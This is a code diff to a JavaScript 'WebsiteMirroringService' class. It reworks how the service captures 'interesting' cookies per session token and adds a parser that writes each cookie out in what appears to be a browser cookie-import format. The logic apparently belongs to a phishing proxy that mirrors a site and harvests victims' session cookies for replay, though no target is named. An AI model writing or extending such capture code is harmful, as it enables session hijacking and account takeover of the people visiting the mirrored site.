@@ -754,26 +754,97 @@ class WebsiteMirroringService {
     const captures = this.captures.get(sessionToken);
     
     cookies.forEach(cookie => {
-      // Check if this cookie matches any interesting patterns
-      const [nameValue] = cookie.split(';');
-      const [name, value] = nameValue.split('=');
+      // Parse the cookie string to extract all attributes
+      const cookieDetails = this.parseCookieString(cookie);
       
-      if (interestingPatterns.some(pattern => pattern.test(name))) {
-        const cookieObj = {
-          name,
-          value,
-          raw: cookie,
-          timestamp: new Date().toISOString()
-        };
+      // Check if this cookie matches any interesting patterns
+      if (interestingPatterns.some(pattern => pattern.test(cookieDetails.name))) {
+        // Add the cookie to captures
+        captures.cookies.push(cookieDetails);
         
-        captures.cookies.push(cookieObj);
-        
-        console.log(`⚠️ Captured interesting cookie: ${name}`);
-        console.log(`📝 Cookie details: ${JSON.stringify(cookieObj, null, 2)}`);
+        console.log(`⚠️ Captured interesting cookie: ${cookieDetails.name}`);
+        console.log(`📝 Cookie details: ${JSON.stringify(cookieDetails, null, 2)}`);
       }
     });
     
     this.captures.set(sessionToken, captures);
+  }
+  
+  /**
+   * Parse cookie string into detailed object format
+   */
+  parseCookieString(cookieStr) {
+    try {
+      // Extract the name-value pair first
+      const [nameValuePair, ...attributes] = cookieStr.split(';');
+      const [name, value] = nameValuePair.split('=').map(s => s.trim());
+      
+      // Initial cookie object with required fields
+      const cookieObj = {
+        name,
+        value,
+        path: '/',
+        domain: '',
+        expirationDate: null,
+        httpOnly: false,
+        secure: false,
+        session: true,
+        hostOnly: true,
+        sameSite: null,
+        storeId: null
+      };
+      
+      // Process additional attributes
+      attributes.forEach(attr => {
+        const [attrName, attrValue] = attr.split('=').map(s => s.trim());
+        
+        if (attrName.toLowerCase() === 'path') {
+          cookieObj.path = attrValue || '/';
+        }
+        else if (attrName.toLowerCase() === 'domain') {
+          cookieObj.domain = attrValue;
+          cookieObj.hostOnly = false;
+        }
+        else if (attrName.toLowerCase() === 'expires') {
+          try {
+            const expiryDate = new Date(attrValue);
+            cookieObj.expirationDate = expiryDate.getTime() / 1000;
+            cookieObj.session = false;
+          } catch (error) {
+            console.error('Error parsing cookie expiry:', error);
+          }
+        }
+        else if (attrName.toLowerCase() === 'max-age') {
+          try {
+            const maxAgeSeconds = parseInt(attrValue);
+            if (!isNaN(maxAgeSeconds)) {
+              cookieObj.expirationDate = (Date.now() / 1000) + maxAgeSeconds;
+              cookieObj.session = false;
+            }
+          } catch (error) {
+            console.error('Error parsing cookie max-age:', error);
+          }
+        }
+        else if (attrName.toLowerCase() === 'samesite') {
+          cookieObj.sameSite = attrValue.toLowerCase();
+        }
+        else if (attrName.toLowerCase() === 'httponly') {
+          cookieObj.httpOnly = true;
+        }
+        else if (attrName.toLowerCase() === 'secure') {
+          cookieObj.secure = true;
+        }
+      });
+      
+      return cookieObj;
+    } catch (error) {
+      console.error('Error parsing cookie string:', error);
+      return {
+        name: 'error',
+        value: 'parsing_failed',
+        raw: cookieStr
+      };
+    }
   }
   
   /**
